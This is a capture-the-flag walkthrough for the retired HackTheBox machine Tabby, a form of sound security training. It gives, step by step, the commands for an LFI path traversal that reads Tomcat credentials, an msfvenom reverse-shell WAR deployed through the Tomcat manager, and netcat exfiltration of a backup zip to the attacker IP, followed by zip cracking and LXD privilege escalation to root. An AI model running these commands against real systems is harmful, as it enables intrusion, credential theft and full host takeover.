# HackTheBox: Tabby Walkthrough

## Machine Info
- **Name**: Tabby
- **OS**: Linux
- **Difficulty**: Easy
- **Points**: 20
- **Release**: 20 Jun 2020
- **IP**: 10.10.10.194

---

## Recon

### Nmap
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.194
nmap -p 80,8080,22 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.194
```
- Open ports: 22 (SSH), 80 (HTTP - Apache), 8080 (Tomcat)

### Add to Hosts
```bash
echo "10.10.10.194 megahosting.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### HTTP (Port 80)
- Site: Hosting company
- `http://megahosting.htb/news.php?file=statement` → possible **LFI**

### Gobuster
```bash
gobuster dir -u http://10.10.10.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40
```
- Found `/news.php`, `/files/`, `/assets/`

### Tomcat (Port 8080)
- Default Tomcat page
- Found hint: Users in `/etc/tomcat9/tomcat-users.xml`

### LFI to Read tomcat-users.xml
```bash
curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```
- **Credentials Found**:
  - `tomcat:$3cureP4s5w0rd123!`
  - Roles: `admin-gui`, `manager-script`

---

## Shell as tomcat

### Deploy WAR via Manager Text Interface
```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=443 -f war -o shell.war
curl -u 'tomcat:$3cureP4s5w0rd123!' \
  --upload-file shell.war \
  'http://10.10.10.194:8080/manager/text/deploy?path=/shell'
```

### Trigger Shell
```bash
nc -lnvp 443
curl http://10.10.10.194:8080/shell
```

### Shell Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo; fg
export TERM=xterm
```

---

## Privilege Escalation: tomcat → ash

### Check `/var/www/html/files` Directory
```bash
ls -l /var/www/html/files
```
- Found: `16162020_backup.zip` owned by ash

### Exfiltrate & Crack Zip
```bash
cat 16162020_backup.zip | nc 10.10.14.18 4444
# On host:
nc -lnvp 4444 > 16162020_backup.zip
zip2john 16162020_backup.zip > hash.john
john hash.john --wordlist=/usr/share/wordlists/rockyou.txt
```
- Password: `admin@it`

### su to ash
```bash
su - ash
Password: admin@it
```
- **User Flag**: `cat ~/user.txt`

---

## Privilege Escalation: ash → root

### Check Groups
```bash
id
```
- ash is in `lxd` group

### Exploit LXD
#### Method 1: Standard Alpine Import
```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine
# On Tabby:
wget http://10.10.14.18/alpine.tar.gz
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root/root
cat root.txt
```

#### Method 2: Minimal LXC Root (m0noc)
```bash
echo "<base64-string>" | base64 -d > root.tar.bz2
lxc image import root.tar.bz2 --alias rootimg
lxc init rootimg rootct -c security.privileged=true
lxc config device add rootct hostdisk disk source=/ path=/mnt/root
lxc start rootct
lxc exec rootct /bin/sh
cd /mnt/root/root
cat root.txt
```

---

## Summary
- **LFI** leads to **Tomcat creds**
- WAR deploy via `manager-script` role
- Backup ZIP with password reuse
- `lxd` group exploit to root